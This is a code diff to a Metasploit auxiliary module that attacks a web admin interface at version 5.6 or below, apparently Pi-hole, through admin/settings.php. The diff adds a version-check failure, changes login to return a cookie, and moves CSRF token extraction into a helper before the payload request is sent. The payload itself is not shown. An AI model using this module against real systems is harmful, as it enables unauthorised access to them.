@@ -56,6 +56,8 @@ class MetasploitModule < Msf::Auxiliary
   def check
     begin
       _version, web_version, _ftl = get_versions
+
+      fail_with(Msf::Exploit::Failure::UnexpectedReply, "#{peer} - Could not connect to web service - no response or non-200 HTTP code") if web_version.nil?
       if web_version && Rex::Version.new(web_version) <= Rex::Version.new('5.6')
         vprint_good("Web Interface Version Detected: #{web_version}")
         return Exploit::CheckCode::Appears
@@ -82,7 +84,7 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::NotVulnerable, 'Target is not vulnerable')
     end
 
-    # get token
+    # check if we need a login
     res = send_request_cgi(
       'uri' => normalize_uri(target_uri.path, 'admin', 'settings.php'),
       'vars_get' => {
@@ -93,21 +95,16 @@ class MetasploitModule < Msf::Auxiliary
 
     # check if we got hit by a login prompt
     if res && res.body.include?('Sign in to start your session')
-      res = login
+      cookie = login
+      fail_with(Failure::BadConfig, 'Incorrect Password') if cookie.nil?
     end
 
-    if res && res.body.include?('Sign in to start your session')
-      fail_with(Failure::BadConfig, 'Incorrect Password')
-    end
+    token = get_token('api')
 
-    # <input type="hidden" name="token" value="t51q3YuxWT873Nn+6lCyMG4Lg840gRCgu03akuXcvTk=">
-    # may also include /
-    %r{name="token" value="(?<token>[\w+=/]+)">} =~ res.body
-
-    unless token
+    if token.nil?
       fail_with(Failure::UnexpectedReply, 'Unable to find token')
     end
-    vprint_status("Using token: #{token}")
+    print_status("Using token: #{token}")
     print_status('Sending payload request')
     res = send_request_cgi(
       'uri' => normalize_uri(target_uri.path, 'admin', 'settings.php'),
